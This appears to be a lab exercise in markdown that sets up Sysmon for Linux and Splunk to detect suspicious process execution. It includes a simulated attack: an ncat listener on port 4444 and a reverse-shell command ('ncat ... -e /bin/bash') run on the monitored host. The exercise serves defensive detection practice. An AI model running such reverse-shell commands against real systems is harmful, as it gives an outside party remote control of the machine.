# Task #2: Monitoring and Investigating Suspicious Process Execution

- Install Sysmon
- Setup Splunk
- Simulate attack
- Visualize

#### Install Sysmon for Linux

- [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

```sh
# 1. Register Microsoft key and feed
root@forwarder:~$ wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
root@forwarder:~$ sudo dpkg -i packages-microsoft-prod.deb

# 2. Install SysmonForLinux
root@forwarder:~$ sudo apt-get update
root@forwarder:~$ sudo apt-get install sysmonforlinux
```

```sh
root@forwarder:~$ nano sysmon-config.xml
```

- [MSTIC Sysmon Resources](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/main.xml)

```sh
root@forwarder:~$ sysmon -i sysmon-config.xml
```

```sh
root@forwarder:~$ sysmon -i sysmon-config.xml
root@forwarder:~$ systemctl restart sysmon
root@forwarder:~$ systemctl status sysmon
```

#### Simulate a Suspicious Process Execution attack and Analyzing logs on Splunk

```sh
root@attack:~$ sudo apt install ncat -y
root@attack:~$ ncat -lnvp 4444
ls
pwd
```

```sh
root@forwarder:~$ sudo apt install ncat net-tools -y  
root@forwarder:~$ ncat <IP Attack> 4444 -e /bin/bash
root@forwarder:~$ lsof -i :4444
root@forwarder:~$ netstat -tulnp | grep 4444
root@forwarder:~$ netstat
root@forwarder:~$ netstat grep 4444
```

#### Setting up Splunk UF and Splunk Dashboard

####Search & Reporting

```sh
index="linux_os_logs" process=sysmon
index="linux_os_logs" process=sysmon TechniqueName=Command
index="linux_os_logs" process=sysmon TechniqueName=Command "ncat"
```
